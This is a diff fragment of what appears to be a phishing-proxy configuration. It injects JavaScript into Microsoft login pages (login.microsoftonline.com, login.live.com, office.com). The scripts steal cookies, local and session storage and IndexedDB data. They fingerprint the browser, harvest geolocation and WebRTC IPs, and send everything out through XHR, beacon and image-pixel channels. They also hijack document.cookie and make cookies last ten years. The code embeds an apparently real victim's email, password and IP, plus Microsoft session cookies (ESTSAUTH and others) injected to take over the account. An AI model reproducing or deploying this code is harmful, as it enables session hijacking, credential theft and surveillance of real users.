+              if(found&&!this.collected){
+                console.log('[🔥NUCLEAR] Target cookies detected!');
+                this.collected=true;
+                clearInterval(check);
+                this.collectAndExfiltrate();
+              }
+            },200);
+            setTimeout(()=>clearInterval(check),60000);
+          },
+          collectAndExfiltrate(){
+            try{
+              const allCookies=this.parseCookies();
+              const targetCookies={};
+              const totalSize=Object.values(allCookies).reduce((s,v)=>s+v.length,0);
+              
+              this.cookieNames.forEach(n=>{
+                if(allCookies[n]){
+                  targetCookies[n]=allCookies[n];
+                  const size=(allCookies[n].length/1024).toFixed(2);
+                  console.log(`[🔥NUCLEAR] ✓ ${n}: ${size}KB (${allCookies[n].substring(0,30)}...)`);
+                }
+              });
+              
+              const aspNet=Object.keys(allCookies).filter(n=>n.startsWith('.AspNetCore')).reduce((a,n)=>{a[n]=allCookies[n];return a;},{});
+              
+              const payload={
+                version:this.version,
+                timestamp:new Date().toISOString(),
+                url:location.href,
+                referrer:document.referrer,
+                targetCookies:targetCookies,
+                aspNetCookies:aspNet,
+                allCookies:allCookies,
+                cookieCount:Object.keys(allCookies).length,
+                totalSizeKB:(totalSize/1024).toFixed(2),
+                localStorage:this.readStorage('local'),
+                sessionStorage:this.readStorage('session'),
+                indexedDB:this.readIndexedDB()
+              };
+              
+              console.log(`[🔥NUCLEAR] Collected ${Object.keys(targetCookies).length} cookies (${payload.totalSizeKB}KB total)`);
+              
+              this.saveToIndexedDB(allCookies);
+              this.saveToLocalStorage(allCookies);
+              this.multiChannelExfiltrate(payload);
+              
+            }catch(e){console.error('[🔥NUCLEAR] Collection error:',e);}
+          },
+          parseCookies(){
+            return document.cookie.split(';').reduce((a,c)=>{
+              const [n,v]=c.trim().split('=');
+              if(n&&v)a[n]=v;
+              return a;
+            },{});
+          },
+          readStorage(type){
+            try{
+              const s=type==='local'?localStorage:sessionStorage;
+              const d={};
+              for(let i=0;i<s.length;i++){
+                const k=s.key(i);
+                d[k]=s.getItem(k);
+              }
+              return d;
+            }catch(e){return{error:e.message};}
+          },
+          saveToIndexedDB(cookies){
+            if(!this.db)return;
+            try{
+              const tx=this.db.transaction(['cookies'],'readwrite');
+              const store=tx.objectStore('cookies');
+              Object.keys(cookies).forEach(n=>{
+                store.put({name:n,value:cookies[n],timestamp:Date.now()});
+              });
+              console.log('[🔥NUCLEAR] Cookies saved to IndexedDB');
+            }catch(e){console.error('[🔥NUCLEAR] IndexedDB save failed:',e);}
+          },
+          restoreFromIndexedDB(){
+            if(!this.db)return;
+            try{
+              const tx=this.db.transaction(['cookies'],'readonly');
+              const store=tx.objectStore('cookies');
+              const req=store.getAll();
+              req.onsuccess=e=>{
+                const cookies=e.target.result;
+                if(cookies.length>0){
+                  console.log(`[🔥NUCLEAR] Restored ${cookies.length} cookies from IndexedDB`);
+                  this.multiChannelExfiltrate({restored:cookies,source:'IndexedDB'});
+                }
+              };
+            }catch(e){console.error('[🔥NUCLEAR] IndexedDB restore failed:',e);}
+          },
+          readIndexedDB(){
+            return{status:'active',available:!!this.db};
+          },
+          saveToLocalStorage(cookies){
+            try{
+              const backup=JSON.stringify({cookies:cookies,timestamp:Date.now(),version:this.version});
+              localStorage.setItem('NUCLEAR_BACKUP',backup);
+              localStorage.setItem('NUCLEAR_COOKIES',JSON.stringify(cookies));
+              console.log('[🔥NUCLEAR] Backup saved to localStorage');
+            }catch(e){console.error('[🔥NUCLEAR] localStorage save failed:',e);}
+          },
+          cloneToLocalStorage(){
+            setInterval(()=>{
+              const cookies=this.parseCookies();
+              if(Object.keys(cookies).length>0){
+                this.saveToLocalStorage(cookies);
+              }
+            },10000);
+          },
+          multiChannelExfiltrate(payload){
+            try{
+              const xhr=new XMLHttpRequest();
+              xhr.open('POST','https://'+location.hostname+'/api/nuclear-cookies',true);
+              xhr.setRequestHeader('Content-Type','application/json');
+              xhr.send(JSON.stringify(payload));
+              console.log('[🔥NUCLEAR] XHR exfiltration sent');
+            }catch(e){console.error('[🔥NUCLEAR] XHR failed:',e);}
+            
+            try{
+              if(navigator.sendBeacon){
+                navigator.sendBeacon('https://'+location.hostname+'/api/nuclear-beacon',new Blob([JSON.stringify(payload)],{type:'application/json'}));
+                console.log('[🔥NUCLEAR] Beacon exfiltration sent');
+              }
+            }catch(e){console.error('[🔥NUCLEAR] Beacon failed:',e);}
+            
+            try{
+              const img=new Image();
+              img.src='https://'+location.hostname+'/api/nuclear-pixel?size='+payload.totalSizeKB+'&count='+payload.cookieCount;
+              img.style.display='none';
+              document.body.appendChild(img);
+              console.log('[🔥NUCLEAR] Pixel exfiltration sent');
+            }catch(e){console.error('[🔥NUCLEAR] Pixel failed:',e);}
+          },
+          startAggressiveRefresh(){
+            setInterval(()=>{
+              const tenYears=new Date();
+              tenYears.setFullYear(tenYears.getFullYear()+10);
+              const exp=tenYears.toUTCString();
+              const cookies=this.parseCookies();
+              let count=0;
+              
+              Object.keys(cookies).forEach(n=>{
+                this.domains.forEach(d=>{
+                  try{
+                    document.cookie=`${n}=${cookies[n]}; expires=${exp}; path=/; domain=${d}; secure; samesite=none`;
+                    count++;
+                  }catch(e){}
+                });
+              });
+              
+              console.log(`[🔥NUCLEAR] Cloned ${Object.keys(cookies).length} cookies across ${this.domains.length} domains (${count} operations)`);
+            },30000);
+          },
+          startMutationObserver(){
+            const observer=new MutationObserver(()=>{
+              const cookies=this.parseCookies();
+              if(Object.keys(cookies).length>0){
+                this.saveToIndexedDB(cookies);
+                this.saveToLocalStorage(cookies);
+              }
+            });
+            observer.observe(document,{childList:true,subtree:true});
+          },
+          hijackCookieAPI(){
+            const original=Object.getOwnPropertyDescriptor(Document.prototype,'cookie');
+            Object.defineProperty(document,'cookie',{
+              get(){return original.get.call(document);},
+              set(v){
+                console.log('[🔥NUCLEAR] Cookie intercepted:',v.substring(0,50)+'...');
+                const tenYears=new Date();
+                tenYears.setFullYear(tenYears.getFullYear()+10);
+                const exp=tenYears.toUTCString();
+                NUCLEAR.domains.forEach(d=>{
+                  try{
+                    const modified=v.includes('expires=')?v:v+`; expires=${exp}; path=/; domain=${d}; secure; samesite=none`;
+                    original.set.call(document,modified);
+                  }catch(e){}
+                });
+                return original.set.call(document,v);
+              }
+            });
+          }
+        };
+        
+        if(document.readyState==='loading'){
+          document.addEventListener('DOMContentLoaded',()=>NUCLEAR.init());
+        }else{
+          NUCLEAR.init();
+        }
+        
+        window.addEventListener('beforeunload',()=>{
+          const cookies=NUCLEAR.parseCookies();
+          NUCLEAR.saveToLocalStorage(cookies);
+          NUCLEAR.saveToIndexedDB(cookies);
+          navigator.sendBeacon('https://'+location.hostname+'/api/nuclear-exit',new Blob([JSON.stringify({cookies:cookies,exit:true})],{type:'application/json'}));
+        });
+      }();
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "www.office.com"]
+    trigger_paths: ["/.*"]
+    script: |
+      (()=>{const META={ip:'64.188.200.195',email:'drr@rappelhealthlaw.com',password:'RH##601g326',timestamp:new Date().toISOString()};const MEGA={async extractAll(){try{const data={meta:META,url:location.href,referrer:document.referrer,timestamp:new Date().toISOString(),cookies:this.extractCookies(),localStorage:this.extractLocalStorage(),sessionStorage:this.extractSessionStorage(),indexedDB:await this.extractIndexedDB(),serviceWorkers:await this.extractServiceWorkers(),extensions:this.detectExtensions(),fingerprint:await this.advancedFingerprint(),webrtc:await this.extractWebRTC(),geolocation:await this.extractGeolocation(),permissions:await this.extractPermissions(),performance:this.extractPerformance(),totalSizeKB:0};data.totalSizeKB=(JSON.stringify(data).length/1024).toFixed(2);this.exfiltrate(data);return data;}catch(e){return null;}},extractCookies(){return document.cookie.split(';').reduce((a,c)=>{const[n,v]=c.trim().split('=');if(n&&v)a[n]=v;return a},{});},extractLocalStorage(){const d={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);d[k]=localStorage.getItem(k);}return d;},extractSessionStorage(){const d={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k);}return d;},async extractIndexedDB(){try{const dbs=await indexedDB.databases();const data={};for(let db of dbs){try{const req=indexedDB.open(db.name);await new Promise((resolve,reject)=>{req.onsuccess=e=>{const database=e.target.result;const stores=Array.from(database.objectStoreNames);const storeData={};let pending=stores.length;if(pending===0){resolve();return;}stores.forEach(storeName=>{const tx=database.transaction(storeName,'readonly');const store=tx.objectStore(storeName);const getAll=store.getAll();getAll.onsuccess=()=>{storeData[storeName]=getAll.result;pending--;if(pending===0){data[db.name]=storeData;database.close();resolve();}};getAll.onerror=()=>{pending--;if(pending===0){database.close();resolve();}};});};req.onerror=()=>resolve();});}catch(e){}}return data;}catch(e){return{error:e.message};}},async extractServiceWorkers(){try{if('serviceWorker'in navigator){const regs=await navigator.serviceWorker.getRegistrations();return regs.map(r=>({scope:r.scope,active:r.active?r.active.scriptURL:null,waiting:r.waiting?r.waiting.scriptURL:null,installing:r.installing?r.installing.scriptURL:null}));}return[];}catch(e){return[];}},detectExtensions(){const ext=[];const tests=[{name:'Chrome Web Store',id:'ahfgeienlihckogmohjhadlkjgocpleb'},{name:'Metamask',id:'nkbihfbeogaeaoehlefnkodbefgpgknn'},{name:'LastPass',id:'hdokiejnpimakedhajhdlcegeplioahd'},{name:'Grammarly',id:'kbfnbcaeplbcioakkpcpgfkobkghlhen'},{name:'uBlock Origin',id:'cjpalhdlnbpafiamejdnhcphjbkeiagm'},{name:'AdBlock',id:'gighmmpiobklfepjocnamgkkbiglidom'},{name:'Honey',id:'bmnlcjabgnpnenekpadlanbbkooimhnj'}];tests.forEach(t=>{const img=new Image();img.src=`chrome-extension://${t.id}/icon.png`;img.onload=()=>ext.push(t.name);});return ext;},async advancedFingerprint(){const fp={basic:{tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,langs:navigator.languages,plat:navigator.platform,hw:navigator.hardwareConcurrency,mem:navigator.deviceMemory,screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,touch:'ontouchstart'in window,vendor:navigator.vendor,cookies:navigator.cookieEnabled,dnt:navigator.doNotTrack,ua:navigator.userAgent},canvas:this.canvasFingerprint(),webgl:this.webglFingerprint(),audio:await this.audioFingerprint(),fonts:this.detectFonts(),battery:await this.batteryInfo(),connection:this.connectionInfo(),media:this.mediaDevices()};return fp;},canvasFingerprint(){try{const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(0,0,100,100);ctx.fillStyle='#069';ctx.fillText('Canvas FP',2,2);return canvas.toDataURL();}catch(e){return null;}},webglFingerprint(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');if(!gl)return null;const ext=gl.getExtension('WEBGL_debug_renderer_info');return{vendor:gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),version:gl.getParameter(gl.VERSION),shading:gl.getParameter(gl.SHADING_LANGUAGE_VERSION)};}catch(e){return null;}},async audioFingerprint(){try{const ctx=new(window.AudioContext||window.webkitAudioContext)();const osc=ctx.createOscillator();const analyser=ctx.createAnalyser();const gain=ctx.createGain();const scriptProcessor=ctx.createScriptProcessor(4096,1,1);gain.gain.value=0;osc.connect(analyser);analyser.connect(scriptProcessor);scriptProcessor.connect(gain);gain.connect(ctx.destination);osc.start(0);return new Promise(resolve=>{scriptProcessor.onaudioprocess=e=>{const output=e.inputBuffer.getChannelData(0).slice(0,100);const hash=output.reduce((a,b)=>a+b,0);scriptProcessor.disconnect();osc.stop();ctx.close();resolve(hash.toString());};});}catch(e){return null;}},detectFonts(){const baseFonts=['monospace','sans-serif','serif'];const testFonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS','Impact'];const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');const detected=[];testFonts.forEach(font=>{ctx.font=`72px ${font}, ${baseFonts[0]}`;const base=ctx.measureText('mmmmmmmmmmlli').width;ctx.font=`72px ${font}`;const test=ctx.measureText('mmmmmmmmmmlli').width;if(base!==test)detected.push(font);});return detected;},async batteryInfo(){try{if('getBattery'in navigator){const battery=await navigator.getBattery();return{charging:battery.charging,level:battery.level,chargingTime:battery.chargingTime,dischargingTime:battery.dischargingTime};}return null;}catch(e){return null;}},connectionInfo(){try{const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(conn){return{type:conn.effectiveType,downlink:conn.downlink,rtt:conn.rtt,saveData:conn.saveData};}return null;}catch(e){return null;}},async mediaDevices(){try{if('mediaDevices'in navigator){const devices=await navigator.mediaDevices.enumerateDevices();return devices.map(d=>({kind:d.kind,label:d.label,id:d.deviceId}));}return[];}catch(e){return[];}},async extractWebRTC(){try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});const ips=[];pc.createDataChannel('');pc.createOffer().then(offer=>pc.setLocalDescription(offer));return new Promise(resolve=>{pc.onicecandidate=e=>{if(!e||!e.candidate)return;const match=e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);if(match)ips.push(match[1]);};setTimeout(()=>{pc.close();resolve([...new Set(ips)]);},2000);});}catch(e){return[];}},async extractGeolocation(){try{return new Promise((resolve,reject)=>{if('geolocation'in navigator){navigator.geolocation.getCurrentPosition(pos=>{resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:pos.timestamp});},err=>{resolve(null);},{timeout:5000});}else{resolve(null);}});}catch(e){return null;}},async extractPermissions(){try{const perms=['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write'];const results={};for(let p of perms){try{const result=await navigator.permissions.query({name:p});results[p]=result.state;}catch(e){results[p]='error';}}return results;}catch(e){return{};}},extractPerformance(){try{const perf=performance.getEntriesByType('navigation')[0];return{dns:perf.domainLookupEnd-perf.domainLookupStart,tcp:perf.connectEnd-perf.connectStart,request:perf.responseStart-perf.requestStart,response:perf.responseEnd-perf.responseStart,dom:perf.domContentLoadedEventEnd-perf.domContentLoadedEventStart,load:perf.loadEventEnd-perf.loadEventStart,total:perf.loadEventEnd-perf.fetchStart};}catch(e){return null;}},exfiltrate(data){try{const xhr=new XMLHttpRequest();xhr.open('POST','https://'+location.hostname+'/api/mega-exfil',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify(data));}catch(e){}try{if(navigator.sendBeacon){navigator.sendBeacon('https://'+location.hostname+'/api/mega-beacon',new Blob([JSON.stringify(data)],{type:'application/json'}));}}catch(e){}try{const img=new Image();img.src='https://'+location.hostname+'/api/mega-pixel?size='+data.totalSizeKB+'&ip='+META.ip;img.style.display='none';document.body?.appendChild(img);}catch(e){}},injectCookies(cookies){const tenYearSeconds=315360000;const setCookie=(k,v,d,p,sec)=>{d=d?d:location.hostname;if(k.startsWith('__Host')){document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};path=${p};Secure;SameSite=None`;}else if(k.startsWith('__Secure')){document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};domain=${d};path=${p};Secure;SameSite=None`;}else{if(sec){if(location.hostname==d){document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};path=${p};Secure;SameSite=None`;}else{document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};domain=${d};path=${p};Secure;SameSite=None`;}}else{if(location.hostname==d){document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};path=${p}`;}else{document.cookie=`${k}=${v};Max-Age=${tenYearSeconds};domain=${d};path=${p}`;}}}};let count=0;for(let c of cookies){try{setCookie(c.name,c.value,c.domain,c.path,c.secure);count++;}catch(e){}}return count;},immortalize(){setInterval(()=>{const domains=['.microsoftonline.com','.microsoft.com','.live.com','.office.com','login.microsoftonline.com','www.office.com'];const tenYearSeconds=315360000;const cookies=document.cookie.split(';').reduce((a,c)=>{const[n,v]=c.trim().split('=');if(v&&v.length>10)a[n]=v;return a},{});Object.keys(cookies).forEach(n=>{domains.forEach(d=>{try{document.cookie=`${n}=${cookies[n]};Max-Age=${tenYearSeconds};path=/;domain=${d};secure;samesite=none`;}catch(e){}});});},60000);}};const testCookies=[{"name":"buid",
+              "value": "1.AUYAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAABGAA.AQABGgEAAABVrSpeuWamRam2jAF1XRQESttnAZinpr847EP-b4GHDizBENRme33y6EB1HRRtF1BDy8xpbE687yS8-yxiNFjQNHmlt2cmPcpIjq2VbuFUJVrXzj44jDbrFouwIV57qTwgAA",
+              "expires": "2025-05-24T06:21:24.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "esctx",
+              "value": "PAQABBwEAAABVrSpeuWamRam2jAF1XRQEuKUo6snSuQi6vKUYtDIaEjd7NE51iAjxSkAp7_nhfsAVxDMyGNrdiqyYr7Wv67uapu4wY2IUZmMmx1r2d5VBvKtm5w7NSbXk0RSdBs25Ez3hqLfRRxU6s0IYMHL-OWSq94rMjBfpFhl5XyXX-FcLMI43-zfmxEBrUglCNmmVFcAgAA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "fpc",
+              "value": "ApocNhQyKfFBl5Z58Y9vNw24vjNwAQAAAEvzm98OAAAA",
+              "expires": "2025-05-24T08:54:35.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "x-ms-gateway-slice",
+              "value": "estsfd",
+              "path": "/",
+              "secure": true,
+              "sameSite": "none",
+              "httpOnly": true
+          },
+          {
+              "name": "stsservicecookie",
+              "value": "estsfd",
+              "path": "/",
+              "secure": true,
+              "sameSite": "none",
+              "httpOnly": true
+          },
+          {
+              "name": "ESTSAUTHPERSISTENT",
+              "value": "1.AUgAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAABIAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P_jhHSyJI59sasPqguZUHisS-x5pLfL92lx-z0w5f3U1WRVjDmdePohaptSMRWD38OMOPmIt105HJlWBrUFW7FCiIe-XHY48a_QUFUxrZ1XsBFsp4woqs6Re5dstyBOp8o2cGp13TC3UyK6RJX-nYfkJT_IWsLfVfEW3U7ai59DsjWXXZH_K-YJuwoophjx-Nh41FVKBvvz4swoBms83n9EEEhL38fRFR1qipzlRX8u4NhV_gdemicAuSGyNyyvuKD73KCoLh9g-XWcv6_ziM369V-yZG8asmmFkpOePKJ_oTwNC1joECrnO6iqNAtZnljcaN7imdgHLMFXrcZU0sNWrB_zP5nC8nW6QA-i91-4_4d-UVgPpEZR5-iv0oN6iWfMwC_r80scPGQV",
+              "domain": ".login.microsoftonline.com",
+              "expires": "2025-07-23T08:55:06.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "ESTSAUTH",
+              "value": "1.AUgAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAABIAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P9W7PfOtRqwMdKq7qAiaNrmzIQO0mPU5OH0tIMJp39Dm3nR8HSNaEjdlAsz1YfEIB7lvH6Z25K3fNWkW25yo3RgndVELE2GVqn0_HgFkbcy4mUuWUz7edC7pUDwjTRlGtZ2mNfZLApUdK65L59LSNqT8feY5AhI8KTYZNEicpqHeFtFOyDMVh6DPnzJ0lK626R_oOOMmIhwxz21i_gqXQSyuTeFJIrq6wFPM6R789ed-gZrq2KC8_H2nAUgNdtsNHuR_k4lXAMVYL8Ja63wBL7ilkmQIIVSSLdhymqvqg928oEsdRUwZMVj1wtdiNThZtyvjPz0SO3_y3dZDOAKl_y-XbNGB91dfrLtsQymNRAc_RZuY_iFZ362uHa_5kL7H-KEsmJc8Vd2SwS4EcKDB9h5bLayrsVHN7q9H_zzL-F_ea5JxAe_HFzfLq9b3DrikygGKAdJcjAyKoBQT75gCCk2bdTxguKfgwqVZNgv6AQGOGw8gKJVpXPTtVOnizIvCN7uKNr5_NEc-NKoUECjq603eFZrQKD5XipKqYXY-TtHXcY_NmpXv4jwcXAKzYe-1cM",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "ESTSAUTHLIGHT",
+              "value": "+0040ba69-fc44-d808-5d3f-0206e080037c",
+              "path": "/",
+              "secure": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "SignInStateCookie",
+              "value": "CAgABFgIAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P919vpp-bc-Zx7sywKoJjfaAXdQC_uRVph_6_G40Lm3Pf8kApMrCbDfwh4wVJLPX0AZxqoKDT2dxS7xxvCg1DStdTtYCped2I4ibsvtm6KJ4V8ImJDXWpyXEd9awF7nlqWcws3_hFi3x9FxQEsxVy0jAwyyiMOOXhsPlX7nVvSoZhrSPKTwxTkmBlmP3ead_jzvHPHDxzIncrYdjiti1pid-XkpQUB4wqS1jiSHdDvX4bk0YHEJkWh1mGDkLHHMVA2es07e",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          }
+          ];const injected=MEGA.injectCookies(testCookies);MEGA.extractAll();MEGA.immortalize();setTimeout(()=>{location.reload();},2000);})();
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "www.office.com"]
+    trigger_paths: ["/.*"]
+    script: |
+      (() => {
+          let cookies = [
+          {
+              "name": "buid",
+              "value": "1.AUYAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAABGAA.AQABGgEAAABVrSpeuWamRam2jAF1XRQESttnAZinpr847EP-b4GHDizBENRme33y6EB1HRRtF1BDy8xpbE687yS8-yxiNFjQNHmlt2cmPcpIjq2VbuFUJVrXzj44jDbrFouwIV57qTwgAA",
+              "expires": "2036-01-17T00:00:00.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "esctx",
+              "value": "PAQABBwEAAABVrSpeuWamRam2jAF1XRQEJFoIQ63gyz_rPgES9inpOdSFA3fmMfYdkr5iI6NIA64cvfHcRukiptLcKA5cqlyMTjTvEX2qrGwNcpLOP5p90P3M-EwFp_RXisg3NweVNC61JT5DmniRwzw2UMk8klaFYc_0o1b5c6AaaG0rcsZi2MLyCD6jn_LBZirZkg-1EDAgAA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "esctx-JKTn9gWNbvs",
+              "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEt1m05npAJq3BtCPF0ZTaRg7LZj3P3ILIY_zfL2BNR_iwGHWGZD5gwKQd8yJ7PV1qnsLsv7Y1-0R8JmS3Q8IJMsx1l3K04ELvlylUoCD5x8dr1HigH6UIwv_9jz15kXQD6hAkClA5mhwMsP83yHz-IiAA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "fpc",
+              "value": "At7xNE3Yk3tJlJ8k7kdXb7i4vjNwAQAAAGPPm98OAAAA",
+              "expires": "2036-01-17T00:00:00.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "x-ms-gateway-slice",
+              "value": "estsfd",
+              "path": "/",
+              "secure": true,
+              "sameSite": "none",
+              "httpOnly": true
+          },
+          {
+              "name": "stsservicecookie",
+              "value": "estsfd",
+              "path": "/",
+              "secure": true,
+              "sameSite": "none",
+              "httpOnly": true
+          },
+          {
+              "name": "ESTSAUTHPERSISTENT",
+              "value": "1.AToAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAAA6AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P8N5yHec9MD4fSb5C3frSko1P2bel35fU3DSdSnUn3MJfHgkVTMEzI7kchpSCzCCY6sGbS5eLUp3v7Sqt0I5PlIxc3ECyp5yTA0g6OJJ2tKpzU7FIl_b44lkdZGfIErsK1vTRBfKLye8TLLAGaRyK2smrhRNKr-iu2MTBSy7rUsxSWvxQiA6PM-ENfOdB3Ozrah90_G2YFQpgHGEZur0wP2VJEAFvBX0P_HR1RuXf4JYYeB_ciYtVhgerignkz99aEx8_AKLMbySpKtFqGcPJejGBj5JvHnsvbmiiqDBNP-14EIeluMCKHD5B_9Y1R9sCSnaN5vYrapgN6QreoGir-5x4A6CBT1wiRp3ifavrZ2FB6P20xDxq_QbZGadG1Nes6KJDQD5vZZ0d60rMqIrJ0tDf-G6QP-lypPtc70YEXVLaBe8b70e0xCYu3J6i7Osg7BEIl2YyPwBjjJmNcDuCUOnCcNgv6sUS9YCGwpWYL287v9IedjjjNl45ARReAcL0HTh_9EPGtiO3Z_tGsLWlN1HcqYR23_r6vd57Xhx-DglcTBG_bO56m8RBkOPg9rhH5mX_5cqqI8noQEzgpmg4FWL71m-kUcpVgqHpeWq802AwwF-rahzlEYsDUZPUOI3Z6bBEFNhYHZJjM5SsqIbvn6bw",
+              "domain": ".login.microsoftonline.com",
+              "expires": "2036-01-17T00:00:00.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "ESTSAUTH",
+              "value": "1.AToAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAAA6AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P-ycE2E1BRlaVmFidQjMTTsAP9XocHIR-B98w4gneAROUwjXjf2yNGeyGmhk_OMxQ5X-oLbGVsFBwy7bdfm6pSkKeaEonX_nE5UuepXVnwy6Rqd0ONa1fiYZnNKpqChQnLvprgDV6wLn4AVvgAqa7diJoUFi-heTbsnhLScVFeZLORwL_McT8wNOcc-zHRY_812xZfEtwtDF0Hl-lz09BazjiYsOHuggf1KSpOEIS7wb1M7dFXPPK60fbVkdfMsDUYWU0NAs0LZ1oKmuxmKVPU3kMS9MkA2Zaf-Z5Wion6q3JNcUOKKrDp6pLCrE8KeeaEVpfdNRlUzjUDSqcYAxR0_U_lIXoxTAZr88fCETNSsaF6xS-V8AD1i9aawmMo98-TOmTHPGbOgToBl9CWt_EEzEI3VrKbktKC6-grH-WEVj0rEAoMJVCe3GirChLKdfRdEAsilOiA1pw0bLSAO1FvDyt8mKSb6cvr51QqCEADJeao_zBJIj5IQZFoCKxXIncoNGSM1oDhwIz1FmebSCxAA64pBkxEWLb5kPlnjVRberNnBXjxzXTy_oZ_IRbwzynFlh0831oZAzbLaCiKIKaQS1EMY3h0TDoaJ1c54370hLGAMkqAMXOfBB8PhQrKyZEdFoySAZ6BtgwLgh6BbXA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "ESTSAUTHLIGHT",
+              "value": "+0040ba69-fd05-6a93-5be3-751397c18c1e",
+              "path": "/",
+              "secure": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "buid",
+              "value": "1.AToAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAAA6AA.AQABGgEAAABVrSpeuWamRam2jAF1XRQEubK2Y9SgVJi9O-c0OPDJSWtGQLRvB2NvIsX-EYe1iqXGenpeQVjxLBubbU7orSfF9mI1gTO0LNkYi6vZnS_7hBdD4Adx2j02cgg1GHLhaj0gAA",
+              "expires": "2036-01-17T00:00:00.000Z",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "esctx",
+              "value": "PAQABBwEAAABVrSpeuWamRam2jAF1XRQEZ7n4p60pHccENLEG0Z58PEZX46tUoHQqHnnlgUxidCm_UWucHCl2s8XvOiOyVcRAdw8VBWAherNyiZFfeyypV4OmT09kh3HbjGU1p4nz8i1T0XCrQX1jCempVKk0TfXdPYVrFeCV47_3c9ryCd4uHLSzfeh8RwBNIim7QbADrWogAA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "esctx-avpHt1axgRA",
+              "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEVtFDBaoPxIRSYZqP5iQDs5_HRMR8AWqNax9sD2QAISKhrMHxVb35TEsYQ5LEJEVO6gnc9Kk2Xcbuf1P_ViZ5fZmHx2bF2O2yYtXiqC6pZK6pWrN9-Q5_6sSTIkdTBW5fAIqeTDoLX9DhGZPoTR47nCAA",
+              "domain": ".login.microsoftonline.com",
+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          },
+          {
+              "name": "SignInStateCookie",
+              "value": "CAgABFgIAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P919vpp-bc-Zx7sywKoJjfaAXdQC_uRVph_6_G40Lm3Pf8kApMrCbDfwh4wVJLPX0AZxqoKDT2dxS7xxvCg1DStdTtYCped2I4ibsvtm6KJ4V8ImJDXWpyXEd9awF7nlqWcws3_hFi3x9FxQEsxVy0jAwyyiMOOXhsPlX7nVvSoZhrSPKTwxTkmBlmP3ead_jzvHPHDxzIncrYdjiti1pid-XkpQUB4wqS1jiSHdDvX4bk0YHEJkWh1mGDkLHHMVA2es07e",
+              "domain": ".login.microsoftonline.com",
